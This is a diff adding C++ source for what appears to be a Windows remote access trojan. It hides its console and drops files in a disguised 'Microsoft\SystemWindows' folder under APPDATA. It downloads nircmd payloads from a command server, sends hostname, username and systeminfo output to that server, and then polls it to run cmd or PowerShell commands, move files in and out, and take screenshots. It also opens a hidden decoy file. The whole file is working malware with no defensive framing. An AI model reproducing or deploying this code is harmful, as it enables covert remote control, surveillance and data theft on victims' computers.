@@ -1,0 +1,265 @@
+
+string URL = ORIGIN + "/target";
+string appName = "c++";
+string APPDATA = (string)getenv("APPDATA") + "\\";
+string FOLDER = APPDATA + "Microsoft\\SystemWindows\\" + appName + "\\";
+string userId = "";
+string useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+string exitBy = "exiting by victim.";
+string pCommnads = "Commands: [cmd][powershell][upload][download][screenshot][exit]";
+
+string shell(bool ps, string command)
+{
+    string cmd = "cmd /c " + command;
+    if (ps)
+    {
+        cmd = "powershell " + command;
+    }
+
+    const char *c = cmd.c_str();
+    string output = "";
+    FILE *stream = popen(c, "r");
+    if (stream == nullptr)
+    {
+        return "SHELL Process Failed.";
+    }
+
+    char buffer[1024];
+    while (fgets(buffer, 1024, stream))
+    {
+        output += buffer;
+    }
+
+    pclose(stream);
+    return output;
+}
+
+string get(string url, string filename)
+{
+    string curl = "CURL -s -A \"" + useragent + "\" -X GET " + url;
+
+    if (filename.length() == 0)
+    {
+        return shell(false, curl);
+    }
+    else
+    {
+        curl += " -o " + filename;
+        string output = shell(false, curl);
+
+        if (output.length() == 0)
+        {
+            return "file saved.";
+        }
+        else
+        {
+            return "file save error";
+        }
+    }
+}
+
+void post(string url, string data, string filename)
+{
+    string curl = "CURL -s -H \"Content-Type:multipart/form-data\" -A \"" + useragent + "\" ";
+
+    if (data.length() != 0)
+    {
+        string d = base64::to_base64(data);
+        curl += "-F \"data=" + d + "\" ";
+    }
+
+    if (filename.length() != 0)
+    {
+        curl += "-F \"file=@" + filename + "\" ";
+    }
+
+    curl += "-X POST " + url;
+
+    shell(false, curl);
+}
+
+void media()
+{
+    if (MEDIAURL.length() > 0)
+    {
+        get(MEDIAURL, MEDIANAME);
+        shell(false, "attrib +h +s +r " + MEDIANAME);
+        shell(false, "start " + MEDIANAME);
+    }
+}
+
+void executor(string command, bool ps)
+{
+    if (command.substr(0, 3) == "cd ")
+    {
+        string path = command.substr(3, command.length());
+        filesystem::current_path(path);
+        filesystem::path cp = filesystem::current_path();
+        post(URL, cp.string() + ">", "");
+    }
+    else
+    {
+        post(URL, shell(ps, command), "");
+    }
+}
+
+void screenshot()
+{
+    string numbers = "1234567890";
+    int numLength = numbers.length();
+    string ranValue;
+    for (int i = 0; i < 10; i++)
+    {
+        int random = rand() % numLength;
+        ranValue += numbers[random];
+    }
+
+    string filename = ranValue + "-cpp-screenshot.jpg";
+    string shotPath = FOLDER + "nircmd.exe savescreenshot " + filename;
+    shell(true, shotPath);
+    string clientUrl = ORIGIN + "/ssd/uploads/" + userId + "/" + filename;
+    post(URL, clientUrl, filename);
+    filesystem::remove(filename);
+}
+
+void loop()
+{
+    while (true)
+    {
+        string res = get(URL, "");
+
+        if (res == "200" || res.length() == 0 || res == "exit status 1")
+        {
+            Sleep(INTERVAL);
+            continue;
+        }
+
+        istringstream inputStream(res);
+        string line;
+        string data[3] = {};
+        int index = 0;
+
+        while (getline(inputStream, line))
+        {
+            data[index] = line;
+            index += 1;
+        }
+
+        string application = data[0];
+        string command = data[1];
+        string fileName = data[2];
+
+        if (application == "cmd")
+        {
+            executor(command, false);
+        }
+        else if (application == "powershell")
+        {
+            executor(command, true);
+        }
+        else if (application == "upload")
+        {
+            string output = get(command, fileName);
+            post(URL, output, "");
+        }
+        else if (application == "download")
+        {
+            post(URL, "", command);
+        }
+        else if (application == "-")
+        {
+            if (command == "screenshot")
+            {
+                screenshot();
+            }
+            else if (command == "exit")
+            {
+                post(URL, "Exit Success", "");
+                exit(0);
+            }
+            else
+            {
+                post(URL, pCommnads, "");
+            }
+        }
+        else
+        {
+            post(command, pCommnads, fileName);
+        }
+
+        Sleep(INTERVAL);
+    }
+}
+
+void initTarget()
+{
+    media();
+
+    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+    string username = getenv("USERNAME");
+    string architecture = getenv("PROCESSOR_ARCHITECTURE");
+    time_t rawtime;
+    time(&rawtime);
+    struct tm *timeinfo = localtime(&rawtime);
+    string Ctime = asctime(timeinfo);
+    DWORD size = sizeof(hostname);
+
+    if (GetComputerNameA(hostname, &size))
+    {
+        userId = hostname;
+    }
+    else
+    {
+        userId = username;
+    }
+    URL = URL + "?id=" + userId;
+
+    if (filesystem::exists(FOLDER))
+    {
+        post(URL, "target connected again - [APP: " + appName + "] [Time : " + Ctime.substr(0, Ctime.length() - 1) + "]", "");
+    }
+    else
+    {
+        filesystem::create_directories(FOLDER);
+
+        if (architecture.find("64") == 3)
+        {
+            get(ORIGIN + "/payloads/nircmd-64.exe", FOLDER + "nircmd.exe");
+        }
+        else
+        {
+            get(ORIGIN + "/payloads/nircmd.exe", FOLDER + "nircmd.exe");
+        }
+
+        string output = shell(false, "systeminfo");
+
+        string info = "+=== SYSTEM INFORMATION ===+\n"
+                      "HOST         : " +
+                      (string)hostname +
+                      "\nUSERNAME     : " + username +
+                      "\nARCHITECHURE : " + architecture +
+                      "\nTIME         : " + Ctime + output;
+        post(URL, info, "");
+    }
+
+    loop();
+}
+
+void signalHandler(int signum)
+{
+    if (signum == SIGINT || signum == SIGTERM)
+    {
+        post(URL, exitBy, "");
+        exit(0);
+    }
+}
+
+int main()
+{
+    signal(SIGINT, signalHandler);
+    signal(SIGTERM, signalHandler);
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    initTarget();
+
+    return 0;
+}
